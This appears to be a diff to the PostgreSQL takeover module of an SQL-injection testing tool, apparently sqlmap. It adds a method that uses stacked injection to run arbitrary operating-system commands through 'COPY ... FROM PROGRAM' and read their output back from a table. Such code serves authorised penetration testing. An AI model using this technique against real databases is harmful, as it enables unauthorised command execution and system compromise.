@@ -102,3 +102,15 @@ class Takeover(GenericTakeover):
         self.createSupportTbl(self.fileTblName, self.tblField, "text")
         inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath), silent=True)
         self.cleanup(onlyFileTbl=True)
+
+    def copyExecCmd(self, cmd):
+        # Reference: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
+        self._forgedCmd = "DROP TABLE IF EXISTS %s;" % self.cmdTblName
+        self._forgedCmd += "CREATE TABLE %s(%s text);" % (self.cmdTblName, self.tblField)
+        self._forgedCmd += "COPY %s FROM PROGRAM '%s';" % (self.cmdTblName, cmd.replace("'", "''"))
+        inject.goStacked(self._forgedCmd)
+
+        query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
+        output = inject.getValue(query, resumeValue=False)
+
+        return output
